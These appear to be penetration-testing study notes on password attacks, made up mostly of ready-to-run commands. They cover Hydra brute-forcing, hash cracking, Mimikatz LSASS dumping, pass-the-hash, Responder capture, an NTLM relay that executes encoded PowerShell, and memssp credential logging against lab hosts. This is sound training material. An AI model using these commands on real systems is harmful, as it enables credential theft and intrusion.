---
title: Password Attacks
---
# Bruteforcing and Spraying
## Hydra
- Hydra supports a wide list of services (`ssh`,`rdp`,`ftp`, `imap` or `vnc` to just name a few) - see `hydra -h` for more details
- To get more info on the service module, we can supply the `-U` parameter (e.g `hydra -U http-form-post`)
- We can try to bruteforce passwords of known users with `hydra`
```zsh
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
- Or alternatively if we have a valid password we can try password spraying with `hydra`
```zsh
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
- We can also combine password and user lists
- To perform an attack on an HTTP form we need to know the POST body we need to send as well as the response for an invalid attempt. 
```zsh
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

hydra -L <users_file> -P <password_file> <url> http[s]-[post|get]-form \
"index.php:param1=value1&param2=value2&user=^USER^&pwd=^PASS^&paramn=valn:[F|S]=messageshowed"
```
- If `F` or `S` are not supplied, `hydra` will default to match the string to a failed attempt (e.g `F`)
- For an HTTP GET with basic auth we can use the module `hhtp-get`
```zsh
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.208.201 http-get "/:A=BASIC:F=Unauthorized"
```
## Netexec
- We can also use `nxc` for password spraying
```zsh
nxc smb administrator.htb -u users -p passwords --continue-on-success
```

# Password Cracking

## Custom Wordlists
- We can use `crunch` or `cewl` to create custom wordlists
```zsh
crunch 6 6 -t Lab%%% > wordlist

cewl -d 2 -m 5 -w wordlist.txt https://example.com
```
- `crunch`: 
	- `-t`  does specify the pattern
	- The first number specifies the minimum length, the second the maximum length
- `cewl`:
	- `-d` specifies the scans depth (while spidering)
	- `-m` specifies the minimum word length
	- `-w` specifies the output file
## Mutating Wordlists
- We can use `hashcat` to mutate existing wordlists
- Hashcat offers a number of rules to mutate wordlist. Some can be found in `/usr/share/hashcat/rules` - a complete list can be found on the [Hashcat Wiki](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
- We can create rules file. Rules are a simple text file (i.e `echo \$1 > prepend.rule`)
- The rules file can contain multiple rules
	- Rules on the same line will get executed at the same time
	- Rules on different lines will get used as a new rule seperately
> [!IMPORTANT]
	Rule 
		$1 c 
	on string password will result in:
		Password1
	Rule
		$1
		c
	on string password will result in:
		password1
		Password
- Some simple rules to use are
	- Prepend a character with `^`
	- Append a character with `$`
	- Capitalize the first letter with `c`
	- Capitalize all letters with `u`
	- Duplicate word with `d`
- The rules file can the be used with the `-r` parameter
```zsh
hashcat -r pepend.rule --stdout wordlist.txt
```

### Transforming rules from hashcat to john
- In order to use rules built with `hashcat` within `john`, we need to add a name for the rules and append them to `/etc/john/john.conf`
```zsh
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```
- After adding this to the configuration file, we can use this rule in `john`
```zsh
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
```

## Identifying Hashes
- We can use `hashid` or `hash-identifier` to try and identify the hashing algorithm
> [!IMPORTANT]
> It is best to try both as some formats are not identified by `hash-identifier` but `hashid` and vice-versa

```zsh
hash-identifier '4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7'

hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'
```

# Password Managers
## Finding Database Files
### Windows
- We can search for password managers database files using `powershell`
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
### Linux
- Use the `find` command on Linux to search for password managers database files
```zsh
find / -iname '*.kdbx' 2>/dev/null
```

### Transforming to crackable format
- We can use `keepass2john` to format the database file to a crackable format. The output can then be used with `john`or `hashcat`
```zsh
keepass2john Database.kdbx > keepass.hash
```
- The JtR script might prepend the filename _Database_ to the hash, which in this case the script inserted as the username associated with the target hash.
- To then find the right mode for `hashcat` we can grep the output of `--help`
```zsh
hashcat --help | grep -i keepass

hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

```

# SSH Private Key Passsphrase
- We can use `ssh2john` to format the private key file to a crackable format. The output can then be used with `john` or `hashcat`
```zsh
ssh2john id_rsa > ssh.hash
```
- Use `hashcat --help` in combination with `grep` to find the right mode
```zsh
hashcat -h | grep -i "ssh"
```
- For john we simply provide a wordlist and the hash
```zsh
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```
> [!WARNING]
> Always try to crack with `john` as well. `Hashcat` can have trouble with some hash formats outputted by `ssh2john`

# Archives
- If we find a password protected ZIP file, we can use `zip2john` to create a crackable hash
```zsh
zip2john protected_archive.zip > zip.hash

john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```
- If the hash cracks or we know the password of the archive, we can use `7z` to extract the content
```zsh
7z x protected_archive.zip
```

# NTLM Cracking
## Extracting NTLM Hashes with Mimikatz
- If we have Administrator rights or our user has the `SeDebugPrivilege` we can extract NTLM hashes from LSASS using the `sekurlsa` module from `mimikatz`
- If our user has the `SeImpersonatePrivilege` we can use `PsExec` or the `token elevation function` from `mimkatz` to obtain the required privileges to extract NTLM hashes
> [!HINT]
> In case `mimikatz` gets blocked by AV, we can also dump the LSASS Process to memory to disk using `procdump.exe` as described on [Fuzzysecurity](https://fuzzysecurity.com/tutorials/18.html)or using Windows Task Manager as described in [Cyberadvisors-Blog](https://blog.cyberadvisors.com/technical-blog/attacks-defenses-dumping-lsass-no-mimikatz/)

### Mimikatz Commands
- To enable `SeDebugPrivilege` rights, we can use `privilege::debug`
- To elevate to SYSTEM user privileges, we can use `token::elevate`
- To dump hashes and cleartext passwords from all available sources we can use `sekurlsa::logonpasswords`
- To dump NTLM hashes from the SAM we can use `lsadump::sam`
> [!IMPORTANT]
> `lsadump::sam`will only show local accounts while `sekurlsa::logonpasswords` might also show domain accounts that have logged on to the system.
> Also do not forget to use `lsadump::lsa /inject` to extracts hashes from memory by asking the LSA server.
- A thorough list and description of all the different mimikatz modules can be found on [thehacker.receipes](https://tools.thehacker.recipes/mimikatz/modules)

## Cracking with Hashcat
- We can use `hashcat --help | grep -i "ntlm"` to get the right mode in order to crack NTLM hashes
- After obtaining the hashes we can start cracking
```zsh
hashcat -m 1000 ntlm_user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

# NTLM Passing
- Different tools like `netexec`, `smbclient`, `impacket-psexeck` or `impacket-wmiexec` allow for a pass-the-hash
```zsh
smbclient \\\\192.168.50.212\\secrets -U 'Administrator' --pw-nt-hash '7a38310ea6f0027ee955abed1762964b'

impacket-psexec -hashes '00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b' Administrator@192.168.50.212

impacket-wmiexec -hashes '00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b' Administrator@192.168.50.212

evil-winrm -i certified.htb -u Administrator -H '7a38310ea6f0027ee955abed1762964'

nxc smb certified.htb -u 'Administrator' -H '7a38310ea6f0027ee955abed1762964'
```
- With `impacket-psexec` we can specify an additional argument to specify which command to run. If left empty, `cmd.exe` will be executed and provides us an interactive shell

# Net-NTLMv2 Cracking
## Capturing Net-NTLMv2 Hashes
- We can use `responder` to capture Net-NTLMv2 hashes if we manage to initiate an authentication to the interface that `responder`is listening on
- We can initiate an authentication by various means (i.e opening an SMB  `dir \\192.168.45.222\somedirectory` or specifying `//192.168.45.222/share/file.txt` in an upload upload form on a web application)
```zsh
sudo responder -I tun0
...
[+] Listening for events... 
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 
```

## Cracking with Hashcat
- We can use `hashcat --help | grep -i "ntlm"` to get the right mode in order to crack NTLM hashes
- After obtaining the hashes we can start cracking
```zsh
hashcat -m 5600 netntlmv2_user.hash /usr/share/wordlists/rockyou.txt
```

## Net-NTLMv2 Relay
- We can relay Net-NTLMv2 hashes with `impacket-ntlmrelayx` from `tarbetbox1` to `targetbox2`
```zsh
impacket-ntlmrelayx --no-http-server -smb2support -t targetbox2 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
- Specify `--no-http-server` if targeting SMB
- We trigger an authentication request to our attack box again by various means (i.e opening an SMB  `dir \\192.168.45.222\somedirectory` or specifying `//192.168.45.222/share/file.txt` in an upload upload form on a web application or using `xp_dirtree` in SQL) on `targetbox1`
- We relay the hash to `targetbox2` and run the command specified by `-c`
> [!Warning]
> The target system needs to have UAC remote restrictions disabled or the command execution will fail. If UAC remote restrictions are enabled on the target then we can only use the local _Administrator_ user for the relay attack.

# Windows Credential Guard
- If Windows credential guard is active, we can not dump non-local credentials from the memory of `lsass.exe` as it is running as a trustlet in VTL1 named `lsaiso.exe` (LSA Isolated)
- But we can try to register our own SSP (Security Service Provider) and register it with LSASS and force the SSPI (Security Service Provider Interface) to use our malicious SSP using `misc::memssp` from `mimkatz`
```zsh
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)
```
- After another user has logged on, the credentials captured by our malicious SSP are then stored in **C:\Windows\System32\mimilsa.log**
- We can get if credential guard is activated using `Get-ComputerInfo` and search for `DeviceGuardSecurityServicesConfigured` and `DeviceGuardSecurityServicesRunning`

# GPP 
- In case we find passwords within GPP (Group Policy Preference), we can decrypt them using `gpp-decrypt`. This is possible due to the fact that the private key used for encryption has been posted on [MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2)
```zsh
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```

